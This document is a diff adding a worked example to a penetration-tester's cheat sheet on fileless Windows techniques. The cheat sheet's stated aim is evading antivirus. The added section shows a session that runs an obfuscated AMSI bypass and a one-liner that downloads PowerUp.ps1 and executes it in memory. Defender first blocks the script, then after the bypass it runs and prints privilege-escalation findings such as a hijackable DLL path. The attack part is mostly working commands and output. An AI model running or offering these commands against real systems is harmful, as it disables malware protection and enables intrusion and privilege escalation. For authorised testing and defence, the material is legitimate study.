@@ -1,10 +1,10 @@
-============================================================================================
+==================================================================================================================
 Living off the land and filess techniques
-============================================================================================
+==================================================================================================================
 
---------------------------------------------------------------------------------------------
+---------------------------------------------------------------
 Why using 'living off the land and fileless' techniques ?
---------------------------------------------------------------------------------------------
+---------------------------------------------------------------
 > The purpose of the 'living off the land and fileless' techniques is to avoid getting detected and blocked by the antivirus and end-point protection
   solutions installed on Windows machines during penetration tests by running scripts and shellcodes directly into memory and making use as much as possible
   of the sysadmin tools and software that already installed on targeted computers.
@@ -21,9 +21,9 @@ Why using 'living off the land and fileless' techniques ?
   Before executing a "hacking" and/or security audit scripts (e.g. '.ps1', '.vbs', '.bat') on a Windows machine is important to disable the Antimalware Scan Interface (AMSI)
   to avoid our scripts being scanned and potentially blocked by the AV installed on the Windows machine.
 
---------------------------------------------------------------------------------------------
+---------------------------------------------------------------
 Microsoft Antimalware Scan Interface (AMSI)
---------------------------------------------------------------------------------------------
+---------------------------------------------------------------
 > The Microsoft Antimalware Scan Interface (AMSI) provides enhanced malware protection by allowing the Antivirus solution installed on a Windows machine
   to scan the applications and scripts before they are executed. 
   
@@ -48,4 +48,82 @@ Microsoft Antimalware Scan Interface (AMSI)
   - https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/
   
   
-  
+==================================================================================================================
+Example - AMSI bypass techniques on a fully patched Windows 10 laptop with Defender (AV) enabled and up-to-date
+==================================================================================================================
+
+---------------------------------------------------------------
+Example 1 - AMSI bypass as a low privileged user
+---------------------------------------------------------------
+
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\Users\auditor> powershell -exec bypass
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Try the new cross-platform PowerShell https://aka.ms/pscore6
+
+PS C:\Users\auditor> net user auditor
+User name                    auditor
+Full Name
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            11/21/2021 4:48:04 AM
+Password expires             1/2/2022 4:48:04 AM
+Password changeable          11/21/2021 4:48:04 AM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   11/21/2021 4:52:08 AM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Users
+Global Group memberships     *None
+The command completed successfully.
+
+PS C:\temp> cd c:\temp
+
+PS C:\temp> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks
+<SNIP>
+This script contains malicious content and has been blocked by your antivirus software.
+    + CategoryInfo          : ParserError: (:) [], ParseException
+    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
+
+PS C:\temp> $Hxl=$null;
+PS C:\temp> $xqhoooo="$([cHAr](83*54/54)+[CHAR]([bYTe]0x79)+[chaR]([BytE]0x73)+[cHAR]([ByTE]0x74)+[chAR]([BYte]0x65)+[chAr]([BYTE]0x6d)).$(('Mänäg'+'ement').NORmAlize([ChAr](13+57)+[cHAr]([BytE]0x6f)+[CHAR](40+74)+[cHaR](92+17)+[CHAr](68+27-27)) -replace [ChAr]([BYte]0x5c)+[CHar](112)+[chAR]([byte]0x7b)+[chAr](77*64/64)+[ChaR](110)+[char](125*63/63)).$(('Autóm'+'âtíon').nOrmALIZE([char]([BYtE]0x46)+[CHAr]([BYtE]0x6f)+[ChaR](114+1-1)+[ChaR]([ByTe]0x6d)+[chaR](68)) -replace [cHar]([ByTE]0x5c)+[cHAR]([bYTe]0x70)+[cHAR]([byTe]0x7b)+[cHAR]([byte]0x4d)+[CHar](110+94-94)+[cHAR]([BYtE]0x7d)).$([chAR]([bYTE]0x41)+[CHAR]([byTE]0x6d)+[ChAR]([ByTE]0x73)+[chaR](105+6-6)+[ChaR](85+23-23)+[cHAR](116*86/86)+[cHar](105)+[cHar]([BYtE]0x6c)+[cHAr](115))";
+PS C:\temp> $wpkfsoadsfehqpe="+[cHAR]([bytE]0x72)+[ChAr](121)+[chAR]([bYtE]0x79)+[cHar](97+3)+[cHar](121+41-41)+[cHAr]([bYte]0x6f)+[cHar]([BYTe]0x66)+[chAr](107+87-87)+[chAr]([BYTE]0x69)";
+PS C:\temp> [Threading.Thread]::Sleep(286);
+PS C:\temp> [Ref].Assembly.GetType($xqhoooo).GetField($([char](71+26)+[char]([BYtE]0x6d)+[CHar]([byte]0x73)+[chaR](105+75-75)+[CHar]([ByTe]0x49)+[chAr]([bytE]0x6e)+[CHar](37+68)+[cHAr](116+2-2)+[Char](70+37-37)+[char](97)+[chAR]([BYTE]0x69)+[chaR](93+15)+[CHAr]([byte]0x65)+[char](100)),"NonPublic,Static").SetValue($Hxl,$true);
+
+PS C:\temp> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks
+
+[*] Running Invoke-AllChecks
+[*] Checking if user is in a local group with administrative privileges...
+[*] Checking for unquoted service paths...
+[*] Checking service executable and argument permissions...
+[*] Checking service permissions...
+[*] Checking %PATH% for potentially hijackable .dll locations...
+HijackablePath : C:\Users\auditor\AppData\Local\Microsoft\WindowsApps\
+AbuseFunction  : Write-HijackDll -OutputFile 'C:\Users\auditor\AppData\Local\Microsoft\WindowsApps\\wlbsctrl.dll'
+                 -Command '...'
+
+[*] Checking for AlwaysInstallElevated registry key...
+[*] Checking for Autologon credentials in registry...
+[*] Checking for vulnerable registry autoruns and configs...
+[*] Checking for vulnerable schtask files/configs...
+[*] Checking for unattended install files...
+[*] Checking for encrypted web.config strings...
+[*] Checking for encrypted application pool and virtual directory passwords...
+
+PS C:\temp>
